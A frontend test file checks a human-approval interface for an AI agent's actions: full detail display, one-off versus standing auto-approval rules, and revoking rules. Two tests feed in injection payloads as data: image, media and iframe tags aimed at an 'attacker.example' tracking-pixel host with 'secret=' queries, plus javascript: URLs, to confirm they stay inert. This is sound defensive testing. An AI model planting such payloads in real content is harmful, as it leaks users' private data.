// @vitest-environment jsdom
/* eslint-disable react/react-in-jsx-scope */

import { act } from 'react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { ActionLogEntry, AiChatMessage, AiChatMetadata, Overseer } from '@gadgets/workshop-shared/api'
import type { ActionDescription } from '@gadgets/workshop-shared/gatekeeper'
import { entry, flushFrames, makeOverseer, makeTestRoot } from './action-test-harness'
import Activity from './Activity'
import ChatInterface from './ChatInterface'

vi.stubGlobal('ResizeObserver', class {
  observe() {}
  unobserve() {}
  disconnect() {}
})
vi.stubGlobal('localStorage', { getItem: () => null, setItem: () => {}, removeItem: () => {} })
vi.stubGlobal('PointerEvent', MouseEvent)
Element.prototype.scrollTo ??= () => {}

vi.mock('@cloudflare/kumo', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@cloudflare/kumo')>()
  const toasts = { add: vi.fn<(options: unknown) => void>() }
  return { ...actual, useKumoToastManager: () => toasts }
})
vi.mock('./FeatureFlagsContext', () => ({
  useUiFeatureFlag: () => ({ enabled: false, loading: false }),
  useUiFeatureFlags: () => ({ flags: {}, loading: false }),
}))
vi.mock('./AuthContext', () => {
  const context = {
    authenticatedApi: {
      listGatekeeperVendors: async () => [],
      getAiConfig: async () => null,
      getAgentByWorkspaceId: async () => null,
      getGroupByWorkspaceId: async () => null,
    },
    currentUser: null,
  }
  return { useAuthenticatedApi: () => context, useOptionalAuthenticatedApi: () => null }
})

const view = makeTestRoot()
const category = { tag: 'message.send', label: 'Send messages' }
const title = 'Send the September report to the finance team'
const connection = 'Finance workspace with a long, specific connection name'
const url = 'https://example.com/workspaces/finance'
const description: ActionDescription = {
  title,
  description: '**Full message:**\n\nQuarterly report.\n\n| Field | Value |\n| --- | --- |\n| Attachment | report.pdf |\n\nFinal detail after the table.',
  implementsRevert: false,
  autoApprovable: true,
  actionKind: category,
}

function request(id = 47, overrides: Partial<ActionDescription> = {}, fields: Partial<ActionLogEntry> = {}) {
  return entry(id, {
    gatekeeperId: 12, resourceTitle: connection, resourceUrl: url,
    ...fields, description: { ...description, ...overrides },
  })
}

function control(label: string, root: ParentNode = document) {
  const matches = [...root.querySelectorAll<HTMLElement>('button, [role="switch"]')]
    .filter(element => (element.getAttribute('aria-label') ?? element.textContent?.trim()) === label)
  expect(matches).toHaveLength(1)
  return matches[0]
}

async function click(label: string, root: ParentNode = document) {
  await act(async () => { control(label, root).click() })
}

function alwaysButtons() {
  return [...document.querySelectorAll<HTMLButtonElement>('button')]
    .filter(button => button.textContent?.trim() === 'Always')
}

function serverWithRules(catalog: Awaited<ReturnType<Overseer['listPreApprovableActions']>> = []) {
  const server = makeOverseer()
  let rules: Awaited<ReturnType<Overseer['listAutoApprovedActionKinds']>> = []
  const api = {
    approveAction: vi.fn<Overseer['approveAction']>(async () => {}),
    rejectAction: vi.fn<Overseer['rejectAction']>(async () => {}),
    listPreApprovableActions: vi.fn<Overseer['listPreApprovableActions']>(async () => catalog),
    listAutoApprovedActionKinds: vi.fn<Overseer['listAutoApprovedActionKinds']>(async () => rules),
    setAutoApprovedActionKind: vi.fn<Overseer['setAutoApprovedActionKind']>(async (gatekeeperId, actionKind) => {
      rules = [...rules, { gatekeeperId, actionKind }]
    }),
    removeAutoApprovedActionKind: vi.fn<Overseer['removeAutoApprovedActionKind']>(async (gatekeeperId, tag) => {
      rules = rules.filter(rule => rule.gatekeeperId !== gatekeeperId || rule.actionKind.tag !== tag)
    }),
  }
  Object.assign(server.overseer, api)
  return { ...server, ...api }
}

async function renderRequests(surface: 'activity' | 'chat', records = [request()]) {
  const server = serverWithRules()
  const onAutoApproveChange = vi.fn<() => void>()
  if (surface === 'activity') {
    await view.render(<Activity overseer={server.overseer} view="review" onViewChange={() => {}} onAutoApproveChange={onAutoApproveChange} />)
  } else {
    const timestamp = new Date()
    const messages: AiChatMessage[] = records.map((record, sequence) => ({
      chatId: 1, sequence, timestamp, author: { type: 'agent', id: 'model', name: 'Model' },
      type: 'action', actionId: record.id, actionLog: record,
    }))
    const metadata: AiChatMetadata = { id: 1, title: 'Thread', started: timestamp, lastActive: timestamp }
    Object.assign(server.overseer, {
      getChatHistory: async () => ({ messages }),
      listChats: async () => [metadata],
      listModels: async () => [],
      onRpcBroken: () => {},
      subscribeToChat: () => ({ [Symbol.dispose]: () => {} }),
    })
    await view.render(<ChatInterface
      workspaceId="workspace" overseer={server.overseer} selectedChatId={1} onNavigateToChat={() => {}}
      pendingConsoleLogCount={0} consoleLogPreview="" consoleLogSeverity="info"
      onConsumeConsoleLogs={() => ''} onDiscardConsoleLogs={() => {}} onOpenGadget={() => {}}
      outputOfWorkpiece={() => undefined} onAutoApproveChange={onAutoApproveChange}
    />)
  }
  await server.resolveSubscription()
  await server.resolvePendingQuery({ entries: records })
  flushFrames()
  return { ...server, onAutoApproveChange }
}

afterEach(() => {
  view.cleanup()
  vi.restoreAllMocks()
})

describe.each(['activity', 'chat'] as const)('%s approval requests', surface => {
  it.each([false, true])('shows the exact action, connection and full Markdown before decisions (blocking=%s)', async awaitDecision => {
    await renderRequests(surface, [request(47, { awaitDecision })])
    expect(document.body.textContent).toContain('Allow this action?')
    expect([...document.querySelectorAll('dt')].map(el => el.textContent)).toEqual(['Action', 'Connection'])
    const values = [...document.querySelectorAll('dd')]
    expect(values[0].textContent).toBe(title)
    expect(values[1].textContent).toContain(connection)
    expect(values[1].textContent).toContain('Connection #12')
    expect(values.every(el => !el.className.includes('truncate'))).toBe(true)
    const link = values[1].querySelector('a')!
    expect(link.href).toBe(url)
    expect(link.rel).toBe('noopener noreferrer')
    expect(document.querySelector('strong')?.textContent).toBe('Full message:')
    expect(document.querySelector('table')?.textContent).toContain('report.pdf')
    const finalDetail = [...document.querySelectorAll('p')].find(el => el.textContent === 'Final detail after the table.')!
    expect(finalDetail).toBeDefined()
    expect(finalDetail.compareDocumentPosition(control('Allow once')) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
    expect(finalDetail.closest('details')).toBeNull()
  })

  it.each(['Allow once', 'Deny'])('%s resolves only the displayed action ID, not a standing rule', async decision => {
    const server = await renderRequests(surface)
    await click(decision)
    expect(decision === 'Allow once' ? server.approveAction : server.rejectAction).toHaveBeenCalledExactlyOnceWith(47)
    expect(decision === 'Allow once' ? server.rejectAction : server.approveAction).not.toHaveBeenCalled()
    expect(server.setAutoApprovedActionKind).not.toHaveBeenCalled()
  })

  it('confirms the category, not the specific title, and cancellation has no effects', async () => {
    const server = await renderRequests(surface)
    await click('Always')
    const dialog = document.querySelector('[role="dialog"]')!
    expect(dialog.textContent).toContain(category.label)
    expect(dialog.textContent).not.toContain(title)
    expect(dialog.textContent).toContain('Connection #12')
    expect(dialog.textContent).toContain(connection)
    expect(dialog.textContent).toMatch(/across all chats and apps/)
    expect(dialog.textContent).toContain('pending and future actions may run without asking')
    expect(dialog.textContent).toContain('Only actions the connection marks as auto-approvable qualify')
    expect(dialog.textContent).toContain('Activity > Auto-approval')
    expect(dialog.textContent).toContain('does not undo')
    expect(server.setAutoApprovedActionKind).not.toHaveBeenCalled()
    await click('Cancel', dialog)
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    expect(server.setAutoApprovedActionKind).not.toHaveBeenCalled()
    expect(server.approveAction).not.toHaveBeenCalled()
    expect(server.rejectAction).not.toHaveBeenCalled()
    await click('Always')
    await click('Enable auto-approval')
    expect(server.setAutoApprovedActionKind).toHaveBeenCalledExactlyOnceWith(12, category)
    expect(server.approveAction).not.toHaveBeenCalled()
    expect(server.onAutoApproveChange).toHaveBeenCalledOnce()
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    expect(document.body.textContent).not.toContain('Always')
  })

  it.each([
    { overrides: { autoApprovable: false }, fields: {} },
    { overrides: { autoApprovable: undefined }, fields: {} },
    { overrides: { actionKind: undefined }, fields: {} },
    { overrides: {}, fields: { gatekeeperId: undefined } },
  ])('does not offer a rule for an ineligible request: %j', async ({ overrides, fields }) => {
    await renderRequests(surface, [request(47, overrides, fields)])
    expect(document.body.textContent).not.toContain('Always')
    expect(control('Allow once')).toBeDefined()
    expect(control('Deny')).toBeDefined()
  })

  it('hides the enabled tag only on its own connection, including connection ID zero', async () => {
    const server = await renderRequests(surface, [
      request(47, {}, { gatekeeperId: 0 }),
      request(48, { title: 'A different specific message' }, { gatekeeperId: 0 }),
      request(49),
    ])
    expect(alwaysButtons()).toHaveLength(3)
    await act(async () => { alwaysButtons()[0].click() })
    expect(document.querySelector('[role="dialog"]')?.textContent).toContain('Connection #0')
    await click('Enable auto-approval')
    expect(server.setAutoApprovedActionKind).toHaveBeenCalledExactlyOnceWith(0, category)
    expect(alwaysButtons()).toHaveLength(1)
    expect(server.approveAction).not.toHaveBeenCalled()
    await act(async () => { alwaysButtons()[0].click() })
    expect(document.querySelector('[role="dialog"]')?.textContent).toContain('Connection #12')
    await act(async () => {
      document.activeElement!.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))
    })
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    expect(server.setAutoApprovedActionKind).toHaveBeenCalledOnce()
  })

  it('keeps unsafe URLs inert without hiding the supplied details', async () => {
    await renderRequests(surface, [request(47, {
      description: 'Full details with [unsafe](javascript:alert%281%29) and [safe](https://example.com/details).',
    }, { resourceUrl: 'javascript:alert(1)' })])
    expect(document.querySelector('dd a')).toBeNull()
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull()
    expect(document.body.textContent).toContain('Full details with unsafe and safe.')
    await click('Always')
    expect(document.querySelector('[role="dialog"] a')).toBeNull()
  })

  it.each([false, true])('never loads images or media from action titles and details (blocking=%s)', async awaitDecision => {
    const injectedTitle = '![private title](https://attacker.example/pixel?secret=title)'
    await renderRequests(surface, [request(47, {
      title: injectedTitle,
      awaitDecision,
      description: `Review **this action**: ${injectedTitle}

![reference image][tracking]

[tracking]: https://attacker.example/pixel?secret=details

![](//attacker.example/empty-alt)

<img src="https://attacker.example/html"><link rel="preload" as="image" href="https://attacker.example/preload">
<video src="https://attacker.example/video" poster="https://attacker.example/poster"></video>
<audio src="https://attacker.example/audio"></audio><iframe src="https://attacker.example/frame"></iframe>

[Read details](https://example.com/details) and [unsafe](javascript:alert%281%29).`,
    })])
    expect(document.querySelector('dd')?.textContent).toBe(injectedTitle)
    expect(document.querySelector('strong')?.textContent).toBe('this action')
    expect(document.body.textContent).toContain('[Image omitted: private title]')
    expect(document.body.textContent).toContain('[Image omitted: reference image]')
    expect(document.body.textContent).toContain('[Image omitted]')
    expect(document.querySelector('img, image, audio, video, source, track, iframe, object, embed, link[rel="preload"], link[rel="prefetch"]')).toBeNull()
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull()
    expect(document.querySelector<HTMLAnchorElement>('a[href="https://example.com/details"]')?.rel).toBe('noopener noreferrer')
    expect(control('Allow once')).toBeDefined()
    expect(control('Deny')).toBeDefined()
  })
})

describe('Activity auto-approval rules', () => {
  async function renderPanel(server: ReturnType<typeof serverWithRules>) {
    await view.render(<Activity overseer={server.overseer} view="auto" onViewChange={() => {}} />)
    await server.resolveSubscription()
    await server.resolvePendingQuery({ entries: [] })
  }

  it('confirms enabling, supports cancellation, and disables directly using the connection and tag', async () => {
    const server = serverWithRules([
      { gatekeeperId: 12, resourceTitle: connection, actionKind: category, alreadyEnabled: false },
      { gatekeeperId: 13, resourceTitle: connection, actionKind: category, alreadyEnabled: false },
    ])
    await renderPanel(server)
    const enable = 'Enable auto-approval for Send messages on connection #12'
    await click(enable)
    expect(control(enable).getAttribute('aria-checked')).toBe('false')
    expect(server.setAutoApprovedActionKind).not.toHaveBeenCalled()
    expect(document.querySelector('[role="dialog"]')?.textContent).toContain('Connection #12')
    expect(document.querySelector('[role="dialog"]')?.textContent).not.toContain('Connection #13')
    await click('Cancel')
    expect(server.setAutoApprovedActionKind).not.toHaveBeenCalled()
    await click(enable)
    await click('Enable auto-approval')
    expect(server.setAutoApprovedActionKind).toHaveBeenCalledExactlyOnceWith(12, category)
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    await click('Disable auto-approval for Send messages on connection #12')
    expect(server.removeAutoApprovedActionKind).toHaveBeenCalledExactlyOnceWith(12, category.tag)
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    expect(control(enable).getAttribute('aria-checked')).toBe('false')
  })

  it('keeps the confirmation open when enabling fails', async () => {
    const server = serverWithRules([{ gatekeeperId: 12, resourceTitle: connection, actionKind: category, alreadyEnabled: false }])
    server.setAutoApprovedActionKind.mockRejectedValue(new Error('unavailable'))
    vi.spyOn(console, 'error').mockImplementation(() => {})
    await renderPanel(server)
    await click('Enable auto-approval for Send messages on connection #12')
    await click('Enable auto-approval')
    expect(document.querySelector('[role="dialog"]')).not.toBeNull()
    expect(control('Enable auto-approval').hasAttribute('disabled')).toBe(false)
    await click('Cancel')
  })

  it.each([false, true])('preserves orphan rule revocation without claiming the connection is gone (catalog failure=%s)', async fails => {
    const server = serverWithRules()
    await server.setAutoApprovedActionKind(99, category)
    if (fails) {
      server.listPreApprovableActions.mockRejectedValue(new Error('unavailable'))
      vi.spyOn(console, 'error').mockImplementation(() => {})
    }
    await renderPanel(server)
    expect(document.body.textContent).toContain('Connection #99')
    expect(document.body.textContent).toContain('Not in the current catalog')
    expect(document.body.textContent).not.toMatch(/no longer offers|Unavailable connection/)
    await click('Disable auto-approval for Send messages on connection #99')
    expect(server.removeAutoApprovedActionKind).toHaveBeenCalledExactlyOnceWith(99, category.tag)
    expect(document.querySelector('[role="dialog"]')).toBeNull()
  })

  it('does not equate an absent catalog with nothing being auto-approvable', async () => {
    await renderPanel(serverWithRules())
    expect(document.body.textContent).toContain('No auto-approval options listed')
    expect(document.body.textContent).toContain('Eligible requests may still offer Always')
    expect(document.body.textContent).not.toContain('Nothing can run automatically')
  })
})
